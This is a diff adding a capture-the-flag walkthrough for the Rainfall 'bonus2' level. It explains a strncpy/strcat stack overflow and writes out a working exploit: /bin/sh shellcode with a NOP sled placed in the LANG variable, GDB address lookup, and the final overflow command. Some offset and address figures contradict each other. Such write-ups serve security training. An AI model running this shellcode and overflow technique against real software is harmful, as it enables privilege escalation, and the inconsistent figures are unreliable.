@@ -1,0 +1,98 @@
+# Rainfall - Bonus2 Walkthrough
+
+A single binary is present in `/home/user/bonus2`. It is owned by `bonus3`.
+
+**Step 1: Reconnaissance**
+We analyze the source code (or Ghidra output).
+
+* `main` takes two arguments (`argv[1]` and `argv[2]`).
+* It copies them using `strncpy` into buffers of size 40 and 32 respectively.
+* It checks an environment variable `LANG`. If it is `fi` (Finnish) or `nl` (Dutch), it changes a greeting string.
+* Finally, it calls `greetuser`, which uses `strcat` to combine everything.
+
+**Step 2: Identifying the Vulnerability**
+I noticed a flaw in how `strncpy` is used.
+`strncpy(dest, src, 40)`
+If `src` is exactly 40 bytes, `strncpy` **does not** append a null terminator (`\0`).
+Later, when `greetuser` calls `strcat`, it won't know where the first string ends. It will keep reading past the buffer boundary, merging `argv[1]` and `argv[2]` into one massive string. This allows us to overflow the buffer in `greetuser`.
+
+**Step 3: The First Attempt (Failure)**
+I tried to exploit this straight away. I sent 40 'A's for the first argument and a pattern of 'B's for the second.
+
+```bash
+gdb --args ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'B'*50")
+
+```
+
+**Result:** Segfault at `0x41414141` (`AAAA`).
+**Analysis:** My 'A's were overwriting the Return Address (EIP) before my 'B's could even get there. The buffer in `greetuser` ("Hello ") was too small. I couldn't fit a shellcode and a return address cleanly. I was stuck.
+
+**Step 4: The Pivot (Changing Language)**
+I looked at the code again. The program behaves differently if `LANG` is set to `nl` (Dutch).
+The greeting becomes "Goedemiddag! ", which is longer than "Hello ".
+I theorized that this longer string would shift the stack alignment, effectively pushing the return address further down.
+
+I tested with `export LANG=nl`:
+
+```bash
+export LANG=nl
+gdb --args ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'B'*50")
+
+```
+
+**Result:** Segfault at `0x42424242` (`BBBB`).
+**Success:** The stack shifted! Now, the overflow happens in my **second argument**, giving me control over exactly what hits the EIP.
+
+**Step 5: Finding the Offset**
+By adjusting the number of 'B's, I found the exact offset.
+
+* `argv[1]`: 40 bytes (fixed to trigger the bug).
+* `argv[2]`: 23 bytes of padding reach the EIP.
+
+**Step 6: Strategy Change (Environment Injection)**
+I initially tried putting the shellcode inside `argv[1]`, but 40 bytes is very tight. It was unstable and crashed often.
+Then I realized: `main` already reads `LANG`. Why not put the shellcode there?
+
+* It has unlimited space.
+* It doesn't get corrupted by `strcat`.
+
+**Step 7: The Exploit**
+
+1. **Prepare the Environment:**
+I set `LANG` to start with `nl` (to pass the check), followed by a massive NOP sled (100 bytes) and my shellcode.
+```bash
+export LANG=nl$(python -c 'print "\x90"*100 + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+```
+
+
+2. **Find the Address:**
+In GDB, I broke `main` and checked the address of the `LANG` variable.
+
+```gdb
+(gdb) disas main
+   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>.
+   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
+```
+
+we then place breakpoint at the second instruction after the call to `getenv` to see where `LANG` points to.
+```gdb
+(gdb) break *0x080485ab
+(gdb) run aaa aaa
+(gdb) info register eax
+eax            0xbffffeb9       -1073742151
+```
+
+
+
+Address: `0xbffffeb8`.
+3. **Execute:**
+I constructed the payload to jump into the middle of my NOP sled (adding ~50 bytes to the address to be safe).
+* Arg 1: 40 'A's.
+we choose a arbitrary +40 to land in the middle of the NOP sled.
+* Arg 2: 23 'B's + Address (`0xbffffeb9` + 40). so 0xbffffeb9+0x25=0xbffffee1 because 0xb9 + 0x25 = 0xE1
+
+
+```bash
+./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xe1\xfe\xff\xbf"')
+```
